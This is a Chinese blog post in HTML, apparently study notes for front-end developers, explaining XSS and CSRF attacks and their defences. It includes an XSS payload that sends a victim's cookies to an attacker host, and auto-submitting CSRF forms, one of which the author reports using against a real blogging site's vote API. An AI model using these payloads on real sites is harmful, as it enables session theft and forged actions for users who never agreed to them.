<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Web学习笔记——网络安全 - 老帅的博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:url" content="https://laoshuaiblog.github.io/posts/ee5ba2d20e5238c432ed82398041da06/">
  <meta property="og:site_name" content="老帅的博客">
  <meta property="og:title" content="Web学习笔记——网络安全">
  <meta property="og:description" content="前言 作为 前端开发者，了解一点 Web 安全方面的基本知识是有很必要的，未必就要深入理解。本文主要介绍常见的网络攻击类型，不作深入探讨。
正文 网络攻击的形式种类繁多，从简单的网站敏感文件扫描、弱口令暴力破解，到 SQL 注入，再到复杂的网络劫持等，种类万千。
本文只介绍以下两种攻击：
XSS 攻击CSRF 攻击 XSS 攻击 XSS，跨站脚本攻击(Cross Site Scripting)，为不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为 XSS。恶意攻击者往Web页面里插入恶意 Script 代码，当用户浏览该页之时，嵌入其中 Web 里面的 Script 代码会被执行，从而达到恶意攻击用户的目的。
XSS 攻击实现的方式和 SQL 注入有点类似，是一种基于 DOM 结构的攻击。利用网站对用户输入、请求参数没有验证，在参数中构造恶意 JavaScript 脚本，嵌入页面运行，从而达到攻击的目的。
如果再细分，XSS 可分成以下三种：
DOM-based XSS（基于 DOM的 XSS 攻击）Stored XSS（基于存储的 XSS 攻击）Reflected XSS（基于反射的 XSS 攻击） 这三种方式大同小异，这里不做细分。
简单示例 举个例子：
&amp;lt;!DOCTYPE html&amp;gt; &amp;lt;html&amp;gt; &amp;lt;head&amp;gt; &amp;lt;meta charset=&#34;utf-8&#34;&amp;gt; &amp;lt;title&amp;gt;&amp;lt;/title&amp;gt; &amp;lt;/head&amp;gt; &amp;lt;body&amp;gt; 文章内容：&amp;lt;%= request.getParameter(&#34;content&#34;) %&amp;gt; &amp;lt;/body&amp;gt; &amp;lt;/html&amp;gt; 我们在浏览器打开连接：http://example.com/page?content=&amp;lt;script&amp;gt;alert(&#39;Hello world&#39;)&amp;lt;/script&amp;gt;，就可以看到一个 Hello world 的弹窗。">
  <meta property="og:locale" content="zh-CN">
  <meta property="og:type" content="article">
  <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2024-03-25T16:25:58+08:00">
    <meta property="article:modified_time" content="2024-03-25T16:25:58+08:00">

	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
  


</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="老帅的博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">老帅的博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">Web学习笔记——网络安全</h1>
			
		</header>
		<div id="gatop"></div>
		<div class="content post__content clearfix">
			
<div id="content_views" class="htmledit_views">
                    <h3 id="前言">前言</h3> 
<p>作为 前端开发者，了解一点 Web 安全方面的基本知识是有很必要的，未必就要深入理解。本文主要介绍常见的网络攻击类型，不作深入探讨。</p> 
<h3 id="正文">正文</h3> 
<p>网络攻击的形式种类繁多，从简单的网站敏感文件扫描、弱口令暴力破解，到 SQL 注入，再到复杂的网络劫持等，种类万千。</p> 
<p>本文只介绍以下两种攻击：</p> 
<ul><li>XSS 攻击</li><li>CSRF 攻击</li></ul> 
<p></p> 
<h3 id="xss-攻击">XSS 攻击</h3> 
<blockquote> 
 <p>XSS，跨站脚本攻击(Cross Site Scripting)，为不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为 XSS。恶意攻击者往Web页面里插入恶意 Script 代码，当用户浏览该页之时，嵌入其中 Web 里面的 Script 代码会被执行，从而达到恶意攻击用户的目的。</p> 
</blockquote> 
<p>XSS 攻击实现的方式和 SQL 注入有点类似，是一种基于 DOM 结构的攻击。利用网站对用户输入、请求参数没有验证，在参数中构造恶意 JavaScript 脚本，嵌入页面运行，从而达到攻击的目的。</p> 
<p>如果再细分，XSS 可分成以下三种：</p> 
<ol><li>DOM-based XSS（基于 DOM的 XSS 攻击）</li><li>Stored XSS（基于存储的 XSS 攻击）</li><li>Reflected XSS（基于反射的 XSS 攻击）</li></ol> 
<p>这三种方式大同小异，这里不做细分。</p> 
<h4 id="简单示例">简单示例</h4> 
<p>举个例子：</p> 
<pre><code>&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
    &lt;meta charset="utf-8"&gt;
    &lt;title&gt;&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
文章内容：&lt;%= request.getParameter("content") %&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre> 
<p>我们在浏览器打开连接：<code>http://example.com/page?content=&lt;script&gt;alert('Hello world')&lt;/script&gt;</code>，就可以看到一个 Hello world 的弹窗。</p> 
<p>只要能在页面插入可运行的脚本，那么就可以做很多事。比如获取页面的某些信息，发送到自己的服务器。或者获取网站的 Cookie。</p> 
<p>攻击者搭建了一个网站，写了个页面或接口：<code>http://me.com?param=xxx</code>。只要有人访问这个页面，服务端就能把 <code>param</code> 参数保存在数据库。</p> 
<p>然后再构造另一个链接：<code>http://example.com/page?content=&lt;script&gt;window.open('me.com?param' + document.cookie)&lt;/script&gt;</code></p> 
<p>只要有人打开这个链接，就能把浏览器在 example.com 上的 cookie 保存到攻击者的服务器。剩下的事就是诱导点击，等着鱼上钩了。</p> 
<h4 id="xss-防御">XSS 防御</h4> 
<p>要做好 XSS 防御，主要是不要相信用户的输入，对所有的请求参数做检查。</p> 
<p>使用富文本时，使用XSS规则引擎进行编码过滤。</p> 
<p>当然，很多时候是不能过滤掉标签的，像博客园这样的网站，用户经常发代码，不能过滤掉，只能进行转码再显示</p> 
<h3 id="csrf">CSRF</h3> 
<h4 id="什么是-csrf">什么是 CSRF</h4> 
<blockquote> 
 <p>CSRF（Cross-site request forgery跨站请求伪造，也被称为“one click attack” 或者 session riding，通常缩写为 CSRF 或者 XSRF，是一种对网站的恶意利用。</p> 
</blockquote> 
<p>简单地说，就是攻击者盗用了你的身份，以你的名义发送恶意请求。</p> 
<h4 id="简单示例-1">简单示例</h4> 
<p>举个栗子。</p> 
<p>某博客网站用户登录后，可以给其他用户点赞。点赞的 API 接口是 <code>http://example.com/like?user_id=xxx</code>，并且这是一个 GET 请求接口。</p> 
<p>A 是一个虚荣的程序员，为了赞丧心病狂。他的用户 ID 是 1234。于是他构造了一个这样的 URL：<code>http://example.com/like?user_id=1234</code>。</p> 
<p>很显然，只要其他用户在博客网站登陆了，并且用户的浏览器请求了这个 URL，那么 A 就能得到一个赞。</p> 
<p>接着，他在博客网站写了一篇文章《程序员 30 天学会把妹技巧》，文章里插入这样的一张图片：</p> 
<pre><code>&lt;img src="http://example.com/like?user_id=1234"&gt;
</code></pre> 
<p>我们知道，浏览器对于图片请求是默认允许的。于是，当已登陆用户浏览他的文章时，A 就会获得一个赞。</p> 
<p>以上示例可以看出，GET 请求的安全性是很低的。当然，这里使用 GET 请求不符合 HTTP 规范。</p> 
<h4 id="升级版示例">升级版示例</h4> 
<p>好景不长，某天，网站管理员忽然发现有一篇文章的赞数高得令人发指，文章质量却是惨不忍睹，很是可疑。看到底部，卧槽，自己竟然也点了推荐？于是赶忙叫程序员加班，把接口改成 POST 请求，修复了这个漏洞。</p> 
<p>然并卵，这依然难不倒 A。于是他写了这段代码，放在他自己的站点上。</p> 
<pre><code>&lt;html&gt;
&lt;head&gt;
    &lt;meta charset="utf-8"&gt;
    &lt;title&gt;&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;form id="form" method="POST" action="http://example.com/like"&gt;
    &lt;input type="hidden" name="user_id" value="1234"&gt;
&lt;/form&gt;
&lt;script&gt;
    var form = document.getElementById('form')
    form.submit()
&lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre> 
<p>诱导点击是一个 CSRF 攻击的常用手段之一。于是他在文章写下：</p> 
<pre><code>深夜福利，有图有真相，请戳 http://laosiji.com。
</code></pre> 
<p>没过多久，他的 ID 就被管理员封了。</p> 
<h3 id="真实示例">真实示例</h3> 
<p>学以致用一直是我学习的常用方法之一。今天就拿博客园来做实验。</p> 
<p>注意，以下示例仅供学习参考！</p> 
<p>浏览器打开开发者工具，点击这篇文章下面的推荐按钮（请点击后再往下阅读），便可以看到博客园推荐 API 的地址是：</p> 
<pre><code>POST http://www.cnblogs.com/mvc/vote/VoteBlogPost.aspx
</code></pre> 
<table><thead><tr><th>参数</th><th>说明</th></tr></thead><tbody><tr><td>blogApp</td><td>用户名（页面 URL 中可以看到）</td></tr><tr><td>postId</td><td>文章 ID（页面 URL 中可以看到）</td></tr><tr><td>voteType</td><td>Digg（赞、顶、推荐的意思）</td></tr><tr><td>isAbandoned</td><td>false（不懂）</td></tr></tbody></table> 
<p>然后写个静态页面，放在你的服务器上：</p> 
<pre><code>&lt;html&gt;
&lt;head&gt;
    &lt;meta charset="utf-8"&gt;
    &lt;title&gt;深夜福利，有图有真相&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;form id="form" method="POST" action="http://www.cnblogs.com/mvc/vote/VoteBlogPost.aspx"&gt;
    &lt;input type="hidden" name="blogApp" value="smallchen"&gt;
    &lt;input type="hidden" name="postId" value="7424994"&gt;
    &lt;input type="hidden" name="voteType" value="Digg"&gt;
    &lt;input type="hidden" name="isAbandoned" value="false"&gt;
&lt;/form&gt;
&lt;script&gt;
    var form = document.getElementById('form')
    form.submit()
&lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre> 
<p>因为不能推荐自己，我把 <code>blogApp</code> 和 <code>postId</code> 改成其他人的文章来测试。然后登录博客园，在服务器环境下打开页面，显示：</p> 
<pre><code>{"Id":0,"IsSuccess":true,"Message":"推荐成功","Data":null}
</code></pre> 
<p>如果未登录，则会提示：</p> 
<pre><code>{
  "Id": 0,
  "IsSuccess": false,
  "Message": "请先&lt;a href='javascript:void(0);' onclick='login()'&gt;登录&lt;/a&gt;",
  "Data": null
}
</code></pre> 
<p>刷新文章页面，嗯~，确实推荐成功了！</p> 
<p>如果你不需要赞，想要好评，也是可以滴。你可以在这篇文章下面写个好评，看看开发者工具的调试信息。</p> 
<p>可以看出接口是：</p> 
<pre><code>POST http://www.cnblogs.com/mvc/PostComment/Add.aspx
</code></pre> 
<table><thead><tr><th>参数</th><th>说明</th></tr></thead><tbody><tr><td>blogApp</td><td>用户名</td></tr><tr><td>postId</td><td>文章 ID</td></tr><tr><td>parentCommentId</td><td>0</td></tr><tr><td>body</td><td>评论内容</td></tr></tbody></table> 
<p>相关代码：（注：完成这篇文章后发现这段代码不起作用，因为表单提交的方式不同，好像涉及到 request payload 相关的知识，我也不懂。这段代码就不删了。）</p> 
<pre><code>&lt;html&gt;
&lt;head&gt;
    &lt;meta charset="utf-8"&gt;
    &lt;title&gt;深夜福利，有图有真相&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;form id="form" method="POST" action="http://www.cnblogs.com/mvc/vote/VoteBlogPost.aspx"&gt;
    &lt;input type="hidden" name="blogApp" value="smallchen"&gt;
    &lt;input type="hidden" name="postId" value="7424994"&gt;
    &lt;input type="hidden" name="parentCommentId" value="0"&gt;
    &lt;input type="hidden" name="body" value="卧槽，我中招了！"&gt;
&lt;/form&gt;
&lt;script&gt;
    var form = document.getElementById('form')
    form.submit()
&lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre> 
<p>当然，你也可以做点其他事情，比如：[根据法律法规，此处无法显示]。</p> 
<h5 id="csrf-防御">CSRF 防御</h5> 
<ul><li>通过 referer、token 或者 验证码 来检测用户提交。</li><li>尽量不要在页面的链接中暴露用户隐私信息。</li><li>对于用户修改删除等操作最好都使用post 操作 。</li><li>避免全站通用的cookie，严格设置cookie的域。</li></ul> 
<h3 id="总结">总结</h3> 
<p>写这篇文章，主要是为了<s>骗赞</s>科普 Web 安全相关的知识，让大家对 Web 安全有基本的了解。<br> 如果你对 Web 安全感兴趣，可以留言讨论哦~</p>
                </div>
		</div>
		<div id="gabottom"></div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/3b2abad83c51992796b2eb6eea64804b/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">P2440 木材加工【二分答案】</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/21681dbb71094c11ca83244b057171c0/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">如何在Linux系统使用宝塔面板搭建Inis博客并发布至公网【内网穿透】</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 老帅的博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://www.w3counter.com/tracker.js?id=151347"></script>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>